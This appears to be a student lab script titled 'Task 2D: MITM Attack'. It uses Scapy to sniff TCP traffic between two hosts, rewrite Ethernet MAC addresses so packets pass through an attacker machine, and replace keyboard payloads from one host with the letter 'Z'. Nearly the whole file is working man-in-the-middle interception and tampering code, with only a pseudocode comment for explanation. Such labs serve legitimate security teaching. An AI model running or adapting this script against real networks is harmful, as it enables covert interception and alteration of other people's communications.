#!/usr/bin/python3

from scapy.all import *

#Task 2D: MITM Attack

'''
Check Ethernet MAC address to determine sender:

if src MAC = A's MAC [08:00:27:cd:a8:db]:
	set src MAC to M's MAC [08:00:27:02:6d:61]
	set dst MAC to B's MAC [08:00:27:b6:ef:b0]
	
	Handle payload to replace each alphanumeric character in the payload with 'Z'
	
elif src MAC = B's MAC [08:00:27:b6:ef:b0]:
	set src MAC to M's MAC [08:00:27:02:6d:61]
	set dst MAC to A's MAC [08:00:27:cd:a8:db]

Send packet	
'''

def spoof_pkt(pkt):
	a_mac = "08:00:27:cd:a8:db"
	b_mac = "08:00:27:b6:ef:b0"
	m_mac = "08:00:27:02:6d:61"

	if (pkt[Ether].src == a_mac):
		print("Packet from A")	
		pkt[Ether].src = m_mac
		pkt[Ether].dst = b_mac
		
		pl = pkt[TCP].payload
		if (type(pl) == scapy.packet.Raw):	#check if keyboard input
			pkt[TCP].remove_payload()		#remove the payload
			del pkt[TCP].chksum				#delete chksum of previous payload
			pkt[TCP] /= 'Z'					#replace payload with 'Z'			
		
		print("Packet spoofed")
	
	elif (pkt[Ether].src == b_mac):
		print("Packet not from A")
		pkt[Ether].src = m_mac
		pkt[Ether].dst = a_mac
		print("Original packet")

	sendp(pkt)
	
pkt = sniff(filter = 'tcp', prn = spoof_pkt)

